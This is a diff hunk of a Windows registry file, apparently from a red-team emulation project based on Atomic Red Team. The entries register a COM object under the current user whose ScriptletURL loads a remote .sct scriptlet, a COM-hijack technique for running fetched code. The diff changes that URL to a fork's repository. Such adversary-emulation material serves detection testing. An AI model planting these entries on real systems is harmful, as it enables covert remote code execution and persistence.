@@ -15,7 +15,7 @@ Windows Registry Editor Version 5.00
 [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]
 @="AtomicRedTeam.1.00"
 [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
-@="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/COMHijackScripts/AtomicRedTeam.sct"
+@="https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/Windows/Payloads/COMHijackScripts/AtomicRedTeam.sct"
 [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
 @="AtomicRedTeam"
 [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}]
